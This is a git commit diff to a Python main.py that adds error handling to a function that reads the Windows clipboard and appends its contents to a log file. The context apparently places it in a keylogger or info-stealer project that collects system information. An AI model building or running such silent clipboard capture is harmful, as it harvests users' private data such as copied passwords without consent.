8de72ebc1f4b3322b4c3aef114395f60d4e21985
SushilkumarDev <sushilkumardeveloper@gmail.com>
2024-05-19 21:14:00 +0530

    copy clipboard function try and except was added

--- main.py
+++ main.py
@@ -78,3 +78,12 @@ system_information()
 
 def copy_clipboard():
     with open(file_merge + clipboard_info, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            f.write("Clipboard Data : \n" + pasted_data + '\n')
+        except:
+            f.write("Clipboard Could not be copied. \n")
+
+copy_clipboard()
